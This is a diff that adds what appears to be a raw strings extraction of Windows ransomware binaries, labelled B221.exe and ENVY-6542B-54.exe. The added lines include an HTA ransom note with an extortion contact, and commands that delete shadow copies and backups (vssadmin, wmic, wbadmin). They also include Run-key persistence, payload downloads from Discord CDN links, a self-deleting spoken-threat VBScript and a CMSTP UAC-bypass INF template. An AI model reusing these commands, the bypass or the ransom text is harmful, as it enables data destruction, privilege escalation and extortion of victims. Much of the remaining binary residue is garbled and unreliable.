@@ -1,0 +1,554 @@
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+!This program cannot be run in DOS mode.
+`.rsrc
+@.reloc
+v4.0.30319
+#Strings
+<>c__DisplayClass17_0
+<rndchz>b__0
+IEnumerable`1
+Microsoft.Win32
+Func`2
+d654654
+CustomRC4
+fileEncryptionrc4
+SHA256
+get_UTF8
+<Module>
+<PrivateImplementationDetails>
+34512C006F8E35B736A7669B190A3C8CF7389160B03D2B46A15C0E98E36C1D6B
+SPIF_SENDWININICHANGE
+SPIF_UPDATEINIFILE
+System.IO
+SPI_SETDESKWALLPAPER
+set_IV
+DownloadData
+B221.info.hta
+mscorlib
+System.Collections.Generic
+DownloadFileAsync
+Thread
+Form1_Load
+add_Load
+distDownload
+payload
+RijndaelManaged
+get_Checked
+bytesToBeEncrypted
+Synchronized
+Append
+password
+defaultInstance
+persistence
+set_Mode
+set_AutoScaleMode
+FileMode
+CryptoStreamMode
+CipherMode
+encryptionStage
+Enumerable
+IDisposable
+RuntimeFieldHandle
+RuntimeTypeHandle
+GetTypeFromHandle
+get_MainModule
+ProcessModule
+set_WindowStyle
+ProcessWindowStyle
+set_Name
+get_FileName
+set_FileName
+file_name
+WriteLine
+System.Core
+get_Culture
+set_Culture
+resourceCulture
+ButtonBase
+ApplicationSettingsBase
+Dispose
+Create
+EditorBrowsableState
+STAThreadAttribute
+CompilerGeneratedAttribute
+GuidAttribute
+GeneratedCodeAttribute
+DebuggerNonUserCodeAttribute
+DebuggableAttribute
+EditorBrowsableAttribute
+ComVisibleAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+TargetFrameworkAttribute
+AssemblyFileVersionAttribute
+AssemblyConfigurationAttribute
+AssemblyDescriptionAttribute
+CompilationRelaxationsAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyCompanyAttribute
+RuntimeCompatibilityAttribute
+SetValue
+B221.exe
+GoodBye
+set_Size
+get_BlockSize
+set_BlockSize
+set_AutoSize
+set_ClientSize
+get_KeySize
+set_KeySize
+System.Threading
+Encoding
+System.Runtime.Versioning
+ToString
+disposing
+System.Drawing
+ComputeHash
+get_ExecutablePath
+dropPath
+get_StartupPath
+GetFolderPath
+get_Length
+GetLength
+length
+fWinIni
+System.ComponentModel
+install
+user32.dll
+ContainerControl
+FileStream
+CryptoStream
+MemoryStream
+uiParam
+pvParam
+Program
+clearmem
+System
+SymmetricAlgorithm
+HashAlgorithm
+Random
+ICryptoTransform
+resourceMan
+passgen
+set_ShowIcon
+GetExtension
+Application
+set_Location
+System.Configuration
+System.Globalization
+uiAction
+System.Reflection
+ControlCollection
+Exception
+fileEncryption
+MainEncryption
+StringComparison
+CultureInfo
+SystemParametersInfo
+set_StartInfo
+ProcessStartInfo
+wallpap
+System.Linq
+set_ShowInTaskbar
+StringBuilder
+SpecialFolder
+sender
+payloadBuffer
+get_ResourceManager
+EventHandler
+System.CodeDom.Compiler
+IContainer
+CurrentUser
+StreamWriter
+TextWriter
+rc4dir
+set_UseVisualStyleBackColor
+.cctor
+CreateEncryptor
+IntPtr
+System.Diagnostics
+customAes
+System.Runtime.InteropServices
+System.Runtime.CompilerServices
+System.Resources
+B221.Form1.resources
+B221.Properties.Resources.resources
+DebuggingModes
+GetDirectories
+B221.Properties
+GetFiles
+EnableVisualStyles
+passwordBytes
+Rfc2898DeriveBytes
+ReadAllBytes
+WriteAllBytes
+GetBytes
+Settings
+EventArgs
+Equals
+get_Controls
+System.Windows.Forms
+Contains
+set_AutoScaleDimensions
+get_Chars
+RuntimeHelpers
+GetCurrentProcess
+set_Arguments
+components
+Exists
+Concat
+Repeat
+extract
+Object
+Select
+System.Net
+set_MinWorkingSet
+op_Explicit
+get_Default
+SetCompatibleTextRenderingDefault
+WebClient
+Environment
+InitializeComponent
+persist
+SuspendLayout
+ResumeLayout
+PerformLayout
+genExt
+System.Text
+get_Text
+set_Text
+set_CreateNoWindow
+set_TabIndex
+set_MinimizeBox
+set_MaximizeBox
+CheckBox
+TextBox
+InitializeArray
+ToArray
+set_Key
+OpenSubKey
+RegistryKey
+System.Security.Cryptography
+get_Assembly
+deleteRecovery
+Directory
+chkUpdateRegistry
+update_registry
+set_Opacity
+rndchz
+WrapNonExceptionThrows
+Copyright 
+  2021
+$18f9f915-9529-466b-b2f5-e2d2d13f733e
+1.0.0.0
+.NETFramework,Version=v4.7.2
+FrameworkDisplayName
+.NET Framework 4.7.2@
+3System.Resources.Tools.StronglyTypedResourceBuilder
+4.0.0.0
+KMicrosoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator
+11.0.0.0
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet
+PADPADP
+<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01//EN' 'http://www.w3.org/TR/html4/strict.dtd'>
+<html>
+  <head>
+    <meta charset='windows-1251'>
+    <title>encrypted</title>
+    <HTA:APPLICATION
+      ICON='msiexec.exe'
+      SINGLEINSTANCE='yes'
+      SysMenu="no">
+    <script language='JScript'>
+      window.moveTo(50, 50);
+      window.resizeTo(screen.width - 100, screen.height - 100);
+    </script>
+    <style type='text/css'>
+      body {
+        font: 15px Tahoma, sans-serif;
+        margin: 10px;
+        line-height: 25px;
+        background: #80d594;
+      }
+      .bold {
+        font-weight: bold;
+      }
+      .mark {
+        background: #338a43;
+        padding: 2px 5px;
+      }
+  img {
+display:block;
+margin:auto;
+      .header {
+text-align: center;
+        font-size: 30px;
+        line-height: 50px;
+        font-weight: bold;
+margin-bottom:20px;
+      }
+      .info {
+        background: #D0D0E8;
+        border-left: 10px solid #00008B;
+      }
+      .alert {
+        background: #fea702;
+        border-left: 10px solid  #ff4308;
+      }
+      .private {
+        border: 1px dashed #000;
+        background: #FFFFEF;
+      }
+.separator {
+  background: #D0D0E8;
+        border-left: 10px solid #D0D0E8;
+      .note {
+        height: auto;
+        padding-bottom: 1px;
+        margin: 15px 0;
+      }
+      .note .title {
+        font-weight: bold;
+        text-indent: 10px;
+        height: 30px;
+        line-height: 30px;
+        padding-top: 10px;
+      }
+      .note .mark {
+        background: #A2A2B5;
+      }
+      .note ul {
+        margin-top: 0;
+      }
+      .note pre {
+        margin-left: 15px;
+        line-height: 13px;
+        font-size: 13px;
+      }
+    </style>
+  </head>
+  <body>
+    <img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAQAAAAAYLlVAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAAAAmJLR0QA/4ePzL8AAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfjAwwMJwSFwIn8AAADNklEQVRo3u2ZTUhUURTHfzozmprmZ1pYEmkfJNEmiwwkSEyFECIQpEUboYhqFYHQXlcti9rUKldWBEUiuQpbtDDNzD5G8qM0HRXLRtO5LdJx3puPd++8+xyIztm88zgf/3veufeee18SdimDI1RxnL0U4gbAzxhDdPGCfpZs+49JWTTyFB8iAq8wTju1pDgXvopOliIGX+d57rHPieBuLvLNIvgaD1KvP/x1FiTDCwQTNOkFcJVfCuEFgq+c0he+minF8AJBH2WRnCUph8/nIZVhb2d5w1smEbjYSTn7SQ/TucsFlnWkPxBW6Xc4RkbIoHKooSNshsxRbT98Eb0mtyM04oqgmR6hUNvtrwrnWDa4nOVMVF0XLfw2aPuosBfezQPTmNpiVtFmnpj0W+wBKMFrcPeJ3RYWNfwwWHSSZgdAHX6Du5uWFpl0myqm1KiQrASgnNQQaZFOS4t5nhvkAnbZAbDHIE0wIGHzmsUQKdXkQwlACtsN8ijfJay8zBjkovgBbCLPlAG/hNUcswa5IH4Ayasdzxr5pBbWRRYMstGHYg04QAkH4FbQFSwTCKbdI7mzWVipbMceKtiCCFqO0OeY1caRbAaKOcgOCpQ+WWTyM8EwvfjkTfJoYZDFONqwaPyTHs7LbktlPNMYep2XuE22dfhsHjkS/i+3Wn/SK2EdoE72UeuyGH8rxbbLLjqlkRlb4TAzDo5fIJiOvRTnR+ju9VJuwveC/wASDsD+2h5KUyyQTVZiALzjFt3MsY16mtmqx2mt9BbUw4EQuzpG
+    <div class='header'>
+<div>ALL YOUR FILES ARE ENCRYPTED* BUT NOT DELETED</div>
+  </div>
+  <div class='bold'>Your computer is infected with a virus.</div>
+ <div class='bold'>Files are encrypted* but not deleted.</div>
+   <div class='bold'>Send an email <span class="mark">neftet@tutanota.com</span>, specify in the subject unique identifier <span class="mark">7AF6F6E7-5499</span> and you will definitly be helped to recover.</div>
+   <div class="bold">*you can send us a couple of files and we will return the restored ones to prove that only we can do it</div> 
+    <div class='note alert'>
+      <div class='title'>IMPORTANT:</div>
+      <ul>
+        <a>1. the infection was due to vulnerabilities in your software.<br></a>
+        <a>2. if you want to make sure that it is impossible to recover files using third-party software, do this not on all files, otherwise you may lose all data.<br></a>
+        <a>3. only communication through our email can guarantee file recover for you. We are not responsible for the actions of third parties who promise to help you - most often they are scammers.<br></a>
+        
+        <a>4. please, do not try to rename encrypted files.<br></a>
+        <a>5. our goal is to return your data, but if you don't contact us, we will not succeed.<br></a>
+      </ul>
+    </div>
+  </body>
+</html>
+E:\@56\B221\B221\B221\obj\Debug\B221.pdb
+_CorExeMain
+mscoree.dll
+|s|s2e|U|
+k|y|7|Z|P
+|s|{={{T|
+|{|] j|z{B|{|O
+|{|]+k{w{E{|S|
+I{V|0|t{qA{{|N
+|{|^6m|x|<d|S|
+J{{{:{{|r5|X|N
+K{V|Dl{x|,d|S|
+|{|_H|{|o'|X|M
+J{{{B{{u|!c|R|
+|Q|`>|u|n
+R|`|.v|n|
+|p|t|<C
+f|x|=B
+b|g|T|
+b4<|GC
+b;|[|?
+b|T|h|
+v4.0.30319
+#Strings
+<Module>
+ENVY-6542B-54.exe
+CMSTPBypass
+mscorlib
+System
+Object
+InfData
+ShowWindow
+SetForegroundWindow
+BinaryPath
+SetInfFile
+SetWindowActive
+GetResource
+nCmdShow
+CommandToExecute
+ProcessName
+System.Runtime.CompilerServices
+CompilationRelaxationsAttribute
+RuntimeCompatibilityAttribute
+ENVY-6542B-54
+System.Runtime.InteropServices
+DllImportAttribute
+user32.dll
+System.IO
+GetRandomFileName
+Convert
+ToChar
+String
+Environment
+SpecialFolder
+GetFolderPath
+Concat
+System.Text
+StringBuilder
+Append
+Replace
+ToString
+WriteAllText
+WriteAllBytes
+System.Diagnostics
+ProcessStartInfo
+set_Arguments
+set_UseShellExecute
+set_CreateNoWindow
+ProcessWindowStyle
+set_WindowStyle
+Process
+IntPtr
+op_Equality
+System.Windows.Forms
+SendKeys
+SendWait
+GetProcessesByName
+Refresh
+get_MainWindowHandle
+System.Reflection
+Assembly
+GetExecutingAssembly
+System.Resources
+ResourceManager
+GetObject
+.cctor
+fw110smxloz.resources
+WrapNonExceptionThrows
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+naksc2a4fdh
+abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/
+.[neftet@tutanota.com].boom
+SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+rundll.exe
+.index
+cmd.exe
+/C vssadmin.exe delete shadows /all /quiet
+/C wmic shadowcopy delete
+/C wbadmin delete catalog -quiet
+https://cdn.discordapp.com/attachments/599226424695455755/800087465523675176/65QEF.bmp
+\65QEF.bmp
+https://cdn.discordapp.com/attachments/599226424695455755/798932401216552974/READ_ME.hta
+\READ_ME.hta
+ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
+Set f=CreateObject("Scripting.FileSystemObject")
+f.DeleteFile Wscript.ScriptFullName, True
+On Error Resume Next
+Set v=CreateObject("sapi.spvoice")
+v.Speak "Attention! Attention!"
+WScript.Sleep(1500)
+v.Speak "All you documents, data bases and other important files were encrypted and Windows can not restore them without special software"
+v.Speak "User action is required as soon as possible to recover the files"
+WScript.Sleep(2000)
+WScript.Sleep(120000)
+/C choice /C Y /N /D Y /T 1 & Del "
+chkUpdateRegistry
+984654654654
+d654654
+notepad.exe
+B221.Properties.Resources
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+Comments
+CompanyName
+FileDescription
+FileVersion
+1.0.0.0
+InternalName
+B221.exe
+LegalCopyright
+Copyright 
+  2021
+LegalTrademarks
+OriginalFilename
+B221.exe
+ProductName
+ProductVersion
+1.0.0.0
+Assembly Version
+1.0.0.0
+REPLACE_COMMAND_LINE
+\temp\
+naksc2a4fdh
+cmd /c start "
+{ENTER}
+fw110smxloz
+[version]
+Signature=$chicago$
+AdvancedINF=2.5
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+[RunPreSetupCommandsSection]
+; Commands Here will be run Before Setup Begins to install
+REPLACE_COMMAND_LINE
+taskkill /IM cmstp.exe /F
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+[AllUSer_LDIDSection]
+"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
+[Strings]
+ServiceName="Crimson"
+ShortSvcName="Crimson"
+c:\windows\system32\cmstp.exe
+VS_VERSION_INFO
+VarFileInfo
+Translation
+StringFileInfo
+000004b0
+FileDescription
+FileVersion
+0.0.0.0
+InternalName
+ENVY-6542B-54.exe
+LegalCopyright
+OriginalFilename
+ENVY-6542B-54.exe
+ProductVersion
+0.0.0.0
+Assembly Version
+0.0.0.0
